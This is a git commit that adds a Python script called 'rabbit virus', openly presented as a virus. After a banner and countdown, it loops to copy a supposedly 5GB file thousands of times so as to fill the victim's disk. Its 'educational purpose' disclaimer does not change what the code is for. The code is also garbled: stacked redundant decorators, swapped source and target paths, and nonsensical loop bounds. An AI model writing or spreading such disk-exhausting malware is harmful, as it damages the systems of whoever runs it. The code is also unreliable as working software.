be23daf6af3767552178794376c587dd239362b0
DANIYAL-EH-24 <sheikh.mohd.daniyal.123@gmail.com>
2024-09-02 15:27:15 +0530

    Add files via upload

---
+++ rabbit virus.py
@@ -0,0 +1,95 @@
+import os
+import shutil
+import time,sys
+from colored import fg, bg, attr
+
+# HELLO I AM DANIYAL . THIS VIRUS  IS MADE  BY ME. DO NOT USE  IT  FOR ANY ILLIGAL PURPOSE.
+# THIS IS A SIMPLE VIRUS THAT WILL MAKE SIMPLE FILES  IN YOUR DIRECTORY.
+#ONE FILE SIZE IS AROUND 5GB .
+#THIS TOOL IS WORKING IN ALL  OPERATING SYSTEMS.
+#THIS TOOL IS MADE UP OF SIX MODULES (OS ,SHUTIL ,TIME ,SYS ,COLORED ,FUNCTOOLS).....
+#IF YOU WANT TO  MAKE IT MORE POWERFUL  THEN  YOU  CAN   ADD  MORE  FEATURES  IN  IT.
+
+
+#IN THIS TOOL FIRST PRINT VIRUS NAME (RABBIT VIRUS)
+
+os.system("cls")
+
+bold = '\33[1m'
+
+print(bold + "{0}-------------------------------------------------------------{1}".format(fg("green"), attr(0)))
+print(bold + "{0}-------------------------------------------------------------{1}".format(fg("green"), attr(0)))
+print(bold + "                                                    ".format(fg("red"), attr(0))) 
+print(bold + "   __     _____ ____  _   _ ____    __  ______   ".format(fg("red"), attr(0)))
+print(bold + "   \ \   / /_ _|  _ \| | | / ___|   \ \/ /  _ \  ".format(fg("red"), attr(0)))
+print(bold + "    \ \ / / | || |_) | | | \___ \    \  /| |_) | ".format(fg("red"), attr(0))) 
+print(bold + "     \ V /  | ||  _ <| |_| |___) |   /  \|  _ <  ".format(fg("red"), attr(0)))
+print(bold + "      \_/  |___|_| \_\\___/|____/   /_/\_\_| \_\  ".format(fg("red"), attr(0)))
+print(bold + "                                                    ".format(fg("red"), attr(0)))
+print(bold + "                                                    ".format(fg("red"), attr(0)))
+
+time.sleep(4)
+#SECOND PRINT MY INFORMATION.THIS IS MY INFORMATION.
+print(bold + "{0}RABBIT VIRUS IS MADE BY DANIYAL{1}".format(fg("green"), attr(0)))
+time.sleep(2)
+print(bold + "{0}THIS TOOL IS MADE BY DANIYAL{1}".format(fg("blue"), attr(0)))
+time.sleep(2)
+print(bold + "{0}FOLLOW MY INSTAGRAM ACCOUNT ==>> @sheikh.daniyal.369{1}".format(fg("yellow"), attr(0)))
+time.sleep(2)
+print(bold + "{0}THIS TOOL IS FOR EDUCATIONAL PURPOSE... THIS VIRUS IS DAGMAGE YOUR SYSTEM...{1}".format(fg("red"), attr(0)))
+time.sleep(2)
+print(bold + "{0}YOU CAN USE THIS FOR YOUE OWN RISK.......{1}".format(fg("red"), attr(0)))
+time.sleep(2)
+print("                                                    ")
+print(bold + "{0}-------------------------------------------------------------{1}".format(fg("green"), attr(0)))
+print(bold + "{0}-------------------------------------------------------------{1}".format(fg("green"), attr(0)))
+#THEN ADD SHORT TIME SLEEP....
+timesleep = 10
+for x in range(timesleep, 0, -1):
+   print(x) 
+   time.sleep(2)
+
+
+
+
+print(bold + "{0}VIRUS INJECTION STARTED.........{1}".format(fg("green"), attr(0)))
+time.sleep(5)
+
+
+from functools import cache
+
+
+@cache
+@cache
+@cache
+@cache
+@cache
+@cache
+@cache
+@cache
+@cache
+
+#AND THE MAIN CODE IS GIVEN BELOW ....
+#CHANGE BELOW CODE TO ADD MORE FUNCTIONS AUR FEATURES....
+    
+def replicate(num_copies):
+    file =  "Rabbit Virus/virus.bin" #FILE COPY PATH
+    path = "Virus.txt"#FILE PASTE PATH
+    script_dir = os.path.dirname(file)
+    script_name = os.path.basename(path)
+    for i in range(num_copies): #ADD (FOR LOOP)
+        copy_name = f"virus_{i}.bin" #FILE NAME FORMAT
+        copy_path = os.path.join(script_name, copy_name)
+        shutil.copy(file, copy_path)
+        print(f"Virus inject ==>> : {copy_path}")
+
+#AND FINALLY RUN ( FOR LOOP )...
+for c in range(200000, 100000000000000000000):
+    if c < 10000000000000000000:
+        num_copies = c 
+        replicate(num_copies) #CALL FUNCTION
+        
+#IF YOU WANT TO CONTACT ME  THEN FOLLOW MY INSTAGRAM ACCOUNT ==>> @sheikh.daniyal.369
+#AND MY GMAIL ID ==>> sheikh.mohd.daniyal.123@gmail.com
+#AND FOLLOW MY INSTAGRAM ACCOUNT....
+
